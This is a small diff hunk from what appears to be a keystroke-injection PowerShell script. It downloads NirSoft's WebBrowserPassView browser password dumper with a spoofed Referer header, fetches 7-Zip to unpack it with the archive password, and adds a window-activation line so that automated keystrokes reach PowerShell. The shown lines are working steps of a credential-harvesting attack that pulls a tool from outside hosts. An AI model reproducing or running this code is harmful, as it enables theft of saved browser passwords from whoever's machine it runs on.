@@ -9,6 +9,7 @@ iwr -Headers @{'Referer' = 'http://www.nirsoft.net/utils/web_browser_password.ht
 iwr -uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip
 Expand-Archive 7z.zip
 .\7z\7za.exe e wbpv.zip
+$wshell.AppActivate("Windows PowerShell")
 Sleep 5
 $wshell.SendKeys("wbpv28821@")
 Sleep 1
